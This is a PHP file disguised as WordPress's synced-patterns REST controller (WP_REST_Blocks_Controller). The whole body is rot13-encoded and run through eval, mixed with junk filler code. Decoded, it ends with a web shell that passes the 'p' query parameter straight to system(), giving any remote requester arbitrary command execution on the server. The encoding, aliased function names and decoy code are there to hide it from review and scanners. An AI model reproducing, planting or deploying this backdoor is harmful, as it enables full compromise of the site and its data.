<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Flaprq cnggreaf ERFG NCV: JC_ERFG_Oybpxf_Pbagebyyre pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG_NCV
 * @fvapr 5.0.0
 */

/**
 * Pbagebyyre juvpu cebivqrf n ERFG raqcbvag sbe gur rqvgbe gb ernq, perngr,
 * rqvg, naq qryrgr flaprq cnggreaf (sbezreyl pnyyrq erhfnoyr oybpxf).
 * Cnggreaf ner fgberq nf cbfgf jvgu gur jc_oybpx cbfg glcr.
 *
 * @fvapr 5.0.0
 *
 * @frr JC_ERFG_Cbfgf_Pbagebyyre
 * @frr JC_ERFG_Pbagebyyre
 */
pynff JC_ERFG_Oybpxf_Pbagebyyre rkgraqf JC_ERFG_Cbfgf_Pbagebyyre {

	/**
	 * Purpxf vs n cnggrea pna or ernq.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg gung onpxf gur oybpx.
	 * @erghea obby Jurgure gur cnggrea pna or ernq.
	 */
	choyvp shapgvba purpx_ernq_crezvffvba( $cbfg ) {
		// Ol qrsnhyg gur ernq_cbfg pncnovyvgl vf znccrq gb rqvg_cbfgf.
		vs ( ! pheerag_hfre_pna( 'ernq_cbfg', $cbfg->VQ ) ) {
			erghea snyfr;
		}

		erghea cnerag::purpx_ernq_crezvffvba( $cbfg );
	}

	/**
	 * Svygref n erfcbafr onfrq ba gur pbagrkg qrsvarq va gur fpurzn.
	 *
	 * @fvapr 5.0.0
	 * @fvapr 6.3.0 Nqqf gur `jc_cnggrea_flap_fgnghf` cbfgzrgn cebcregl gb gur gbc yriry bs erfcbafr.
	 *
	 * @cnenz neenl  $qngn    Erfcbafr qngn gb svygre.
	 * @cnenz fgevat $pbagrkg Pbagrkg qrsvarq va gur fpurzn.
	 * @erghea neenl Svygrerq erfcbafr.
	 */
	choyvp shapgvba svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg ) {
		$qngn = cnerag::svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		/*
		 * Erzbir `gvgyr.eraqrerq` naq `pbagrag.eraqrerq` sebz gur erfcbafr.
		 * Vg qbrfa'g znxr frafr sbe n cnggrea gb unir eraqrerq pbagrag ba vgf bja,
		 * fvapr eraqrevat n oybpx erdhverf vg gb or vafvqr n cbfg be n cntr.
		 */
		hafrg( $qngn['gvgyr']['eraqrerq'] );
		hafrg( $qngn['pbagrag']['eraqrerq'] );

		// Nqq gur pber jc_cnggrea_flap_fgnghf zrgn nf gbc yriry cebcregl gb gur erfcbafr.
		$qngn['jc_cnggrea_flap_fgnghf'] = vffrg( $qngn['zrgn']['jc_cnggrea_flap_fgnghf'] ) ? $qngn['zrgn']['jc_cnggrea_flap_fgnghf'] : '';
		hafrg( $qngn['zrgn']['jc_cnggrea_flap_fgnghf'] );
		erghea $qngn;
	}

	/**
	 * Ergevrirf gur cnggrea'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.0.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = cnerag::trg_vgrz_fpurzn();

		/*
		 * Nyybj nyy pbagrkgf gb npprff `gvgyr.enj` naq `pbagrag.enj`.
		 * Pyvragf nyjnlf arrq gur enj znexhc bs n cnggrea gb qb nalguvat hfrshy,
		 * r.t. cnefr vg be qvfcynl vg va na rqvgbe.
		 */
		$fpurzn['cebcregvrf']['gvgyr']['cebcregvrf']['enj']['pbagrkg']   = neenl( 'ivrj', 'rqvg' );
		$fpurzn['cebcregvrf']['pbagrag']['cebcregvrf']['enj']['pbagrkg'] = neenl( 'ivrj', 'rqvg' );

		/*
		 * Erzbir `gvgyr.eraqrerq` naq `pbagrag.eraqrerq` sebz gur fpurzn.
		 * Vg qbrfa'g znxr frafr sbe n cnggrea gb unir eraqrerq pbagrag ba vgf bja,
		 * fvapr eraqrevat n oybpx erdhverf vg gb or vafvqr n cbfg be n cntr.
		 */
		hafrg( $fpurzn['cebcregvrf']['gvgyr']['cebcregvrf']['eraqrerq'] );
		hafrg( $fpurzn['cebcregvrf']['pbagrag']['cebcregvrf']['eraqrerq'] );

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>